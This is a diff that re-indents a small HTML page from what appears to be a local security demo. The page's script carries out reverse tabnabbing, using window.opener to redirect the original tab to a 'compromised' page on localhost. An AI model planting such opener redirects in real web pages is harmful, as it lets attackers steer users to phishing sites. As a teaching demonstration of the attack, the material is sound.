@@ -1,20 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head>
+  <head>
     <title>Malicious Page</title>
-</head>
-<body>
+  </head>
+  <body>
+    <h2>Malicious Page</h2>
 
-<h2>Malicious Page</h2>
+    <script>
+      // Attack: redirect the original tab
+      if (window.opener) {
+        window.opener.location =
+          "http://127.0.0.1:5500/html/security_demo/compromised.html";
+      }
+    </script>
 
-<script>
-    // Attack: redirect the original tab
-    if (window.opener) {
-        window.opener.location = "http://127.0.0.1:5500/html/security_demo/compromised.html";
-    }
-</script>
-
-<p>This is Malicious page.</p>
-
-</body>
+    <p>This is Malicious page.</p>
+  </body>
 </html>
